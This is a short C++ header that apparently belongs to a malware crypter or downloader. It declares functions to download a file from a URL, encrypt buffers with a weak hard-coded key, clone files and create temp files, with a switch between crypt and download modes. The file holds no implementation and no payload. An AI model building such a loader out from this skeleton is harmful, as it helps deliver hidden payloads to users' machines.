#pragma once
#include "stdafx.h"
#include <Windows.h>
#include <vector>
#include <string>
#include <fstream>
#include <iostream>
#include <cstdio>
#include <atlbase.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wininet.h>
#include <time.h>
#include <thread>

#include <urlmon.h>
#include "Base64.h"
#pragma comment(lib, "urlmon.lib")



typedef unsigned __int8 BYTE;
#define CRYPT 0
#define DOWNLOAD 1
#define MODE DOWNLOAD
#define KEY { 0x19 , 0x28 } // WEAK AS FUCK PLS LONGER


extern std::string RandomString(int len);
extern int clone_file(char* path, PVOID buffer, DWORD size);
extern std::vector < BYTE > crypt(std::vector < BYTE > &inp, std::vector < BYTE > &key);
extern std::string getTempFile(char* prefix);
extern std::vector < BYTE > readFile(std::string filename);
extern std::vector < BYTE > downl(char* url);


